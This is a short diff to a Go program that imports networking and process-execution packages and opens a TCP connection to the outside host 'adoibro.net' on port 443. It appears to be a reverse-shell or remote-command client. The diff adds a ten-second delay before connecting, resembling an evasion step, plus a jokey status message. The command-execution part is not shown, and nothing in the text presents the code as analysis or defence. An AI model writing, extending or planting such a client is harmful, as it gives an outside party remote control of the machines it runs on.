@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"fmt"
 	"log"
 	"net"
 	"os/exec"
@@ -14,6 +15,10 @@ const (
 )
 
 func main() {
+
+	time.Sleep(10 * time.Second)
+
+	fmt.Printf("Slept a bit, now back to business. Where are our rabbits?")
 
 	time_out := time.Duration(t_secs) * time.Second
 	conn, err := net.DialTimeout("tcp", "adoibro.net:443", time_out)
